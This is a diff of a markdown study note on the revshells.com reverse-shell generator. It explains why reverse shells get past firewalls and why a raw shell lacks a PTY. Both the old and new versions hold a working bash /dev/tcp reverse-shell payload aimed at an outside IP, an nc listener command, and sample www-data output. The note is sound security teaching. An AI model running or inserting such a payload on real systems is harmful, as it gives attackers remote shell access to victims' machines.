@@ -1,7 +1,7 @@
 ---
 title: "revshells.com"
 aliases: ["revshells", "reverse shell generator"]
-tags: [tree/tooling, cyber/tooling/offensive/web-tools/revshells, type/tool, level/operator]
+tags: [tree/tooling, cyber/tooling/offensive/web-tools/revshells, type/tool, difficulty/medium]
 Domain: "[[Web-Based Tools & References]]"
 Color: "#708090"
 ---
@@ -16,7 +16,7 @@ revshells.com is an online **reverse-shell generator**. You enter your listener 
 ## Parent Learning Order
 GTFOBins -> LOLBAS -> CrackStation -> Aperisolve -> revshells.com
 
-## Crook — The Mental Model
+## Exploiting the asymmetry firewalls create
 
 A firewall usually blocks *inbound* connections but allows *outbound* ones. A **reverse shell** exploits that asymmetry: instead of you connecting *to* the victim (a bind shell, usually blocked), the victim connects *back to you*, and its shell's input/output ride that connection. You run a listener; the victim "calls home."
 
@@ -30,7 +30,7 @@ flowchart LR
 
 The reverse direction is the whole trick — outbound egress is the path fewest firewalls block.
 
-## Operator — Make It Work
+## Listener first, then the payload
 
 Set `LHOST`/`LPORT` on the site, choose a shell, and it generates both halves. Start the listener first, then run the payload on the target:
 
@@ -41,19 +41,19 @@ Listening on 0.0.0.0 4444
 
 ```bash
 # victim (generated bash payload)
-bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
+bash -i >& /dev/tcp/198.51.100.9/4444 0>&1
 ```
 
 ```shell-session
 attacker$ nc -lvnp 4444
-Connection received on 10.0.0.20 51234
+Connection received on 10.10.20.20 51234
 victim$ id
 uid=33(www-data) gid=33(www-data)
 ```
 
 The site offers the same shell in every flavour — `nc`, `nc -e`, python3, PHP, PowerShell, Perl, Ruby, Go, `mkfifo` — so whatever the victim *has*, there's a payload. It also generates the listener line and a one-click **`Ctrl-Z` → `stty raw -echo`** TTY-upgrade snippet.
 
-## Root — Internals & The Deliberate Break
+## Why a raw shell breaks the moment you need a terminal
 
 A raw reverse shell is a *dumb* shell — and discovering its limits is the lesson:
 
@@ -75,11 +75,13 @@ victim$ sudo su
 
 Understanding *why* (a reverse shell is a byte pipe, not a terminal — no PTY means no line discipline, no job control) is what separates "the shell keeps dying" from a stable, interactive foothold. The generator gives you the payload; knowing the PTY limitation makes it usable.
 
-## Crook → Operator → Root Checkpoint
+## Summary
 
-- **Crook:** Why does a reverse shell have the victim connect *out* to you instead of you connecting in?
-- **Operator:** The target has python but not `nc`. How does revshells.com still get you a shell?
-- **Root:** Explain why `sudo` and `Ctrl-C` misbehave in a raw reverse shell, and what a TTY upgrade fixes.
+You should now be able to:
+
+- Why does a reverse shell have the victim connect *out* to you instead of you connecting in?
+- The target has python but not `nc`. How does revshells.com still get you a shell?
+- Explain why `sudo` and `Ctrl-C` misbehave in a raw reverse shell, and what a TTY upgrade fixes.
 
 ---
 > 🔼 Up: [[Web-Based Tools & References]]
